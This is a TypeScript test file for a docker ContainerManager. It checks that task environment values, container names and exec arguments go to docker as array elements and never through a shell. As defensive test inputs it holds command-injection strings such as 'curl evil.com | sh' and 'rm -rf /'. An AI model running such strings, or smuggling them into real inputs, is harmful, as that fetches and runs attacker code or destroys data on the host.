/**
 * Tests for ContainerManager
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';

import { ContainerManager } from './container-manager';

const mockExecute = vi.fn();
vi.mock('utils/safe-exec', () => ({
	SafeExecutor: {
		execute: (...args: unknown[]) => mockExecute(...args)
	}
}));

vi.mock('output/logger', () => ({
	getLogger: () => ({
		debug: vi.fn(),
		error: vi.fn(),
		info: vi.fn(),
		warn: vi.fn()
	})
}));

function queueExecuteResult(stdout: string, stderr = ''): void {
	mockExecute.mockResolvedValueOnce({ exitCode: 0, stderr, stdout });
}

function queueExecuteError(message: string): void {
	mockExecute.mockRejectedValueOnce(new Error(message));
}

describe('ContainerManager', () => {
	let manager: ContainerManager;

	beforeEach(() => {
		vi.clearAllMocks();
		manager = new ContainerManager();
	});

	describe('createContainer', () => {
		it('passes docker run as an array-form command with no shell interpolation of the environment', async () => {
			// The exploration <task> argument flows into environment.TASK — a
			// task string containing a quote and shell metacharacters must not
			// be able to break out of a constructed shell command, because there
			// is no shell command being constructed at all.
			queueExecuteResult('container123\n');

			await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: { TASK: 'foo" ; curl evil.com | sh #' },
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});

			expect(mockExecute).toHaveBeenCalledWith(
				'docker',
				expect.arrayContaining(['-e', 'TASK=foo" ; curl evil.com | sh #'])
			);
			const [, args] = mockExecute.mock.calls[0] as [string, string[]];
			expect(args).toContain('run');
			expect(args.every((arg) => typeof arg === 'string')).toBe(true);
		});

		it('returns the trimmed container id from stdout', async () => {
			queueExecuteResult('abc123def456\n');

			const id = await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});

			expect(id).toBe('abc123def456');
		});

		it('wraps failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such image');

			await expect(
				manager.createContainer({
					container_name: 'exp-container',
					cpu_limit: '1',
					environment: {},
					image: 'nonexistent',
					memory_limit: '512m',
					shared_volume_path: '/shared',
					worktree_path: '/worktree'
				})
			).rejects.toThrow(/Failed to create container/);
		});
	});

	describe('removeContainer', () => {
		it('retries and succeeds when docker transiently reports removal already in progress', async () => {
			queueExecuteError(
				'Command failed with exit code 1: Error response from daemon: removal of container my-container is already in progress'
			);
			queueExecuteResult('');

			await expect(manager.removeContainer('my-container')).resolves.toBeUndefined();
			expect(mockExecute).toHaveBeenCalledTimes(2);
		});

		it('does not retry when the container does not exist', async () => {
			queueExecuteError(
				'Command failed with exit code 1: Error response from daemon: No such container: missing-container'
			);

			await expect(manager.removeContainer('missing-container')).resolves.toBeUndefined();
			expect(mockExecute).toHaveBeenCalledTimes(1);
		});

		it('throws after exhausting retries when removal never completes', async () => {
			const message =
				'Command failed with exit code 1: Error response from daemon: removal of container stuck-container is already in progress';
			queueExecuteError(message);
			queueExecuteError(message);
			queueExecuteError(message);

			await expect(manager.removeContainer('stuck-container')).rejects.toThrow(/already in progress/);
			expect(mockExecute).toHaveBeenCalledTimes(3);
		});

		it('passes the container name as its own array element, not interpolated into a command string', async () => {
			queueExecuteResult('');

			await manager.removeContainer('exp-container"; rm -rf / #', true);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['rm', '-f', 'exp-container"; rm -rf / #']);
		});
	});

	describe('execInContainer', () => {
		it('passes the command array unchanged, with no shell involved', async () => {
			queueExecuteResult('output\n');

			await manager.execInContainer('exp-container', ['echo', 'hello; rm -rf /']);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['exec', 'exp-container', 'echo', 'hello; rm -rf /']);
		});
	});

	describe('killContainer', () => {
		it('passes the signal as its own array element', async () => {
			queueExecuteResult('');

			await manager.killContainer('exp-container', 'SIGTERM');

			expect(mockExecute).toHaveBeenCalledWith('docker', ['kill', '-s', 'SIGTERM', 'exp-container']);
		});
	});
});
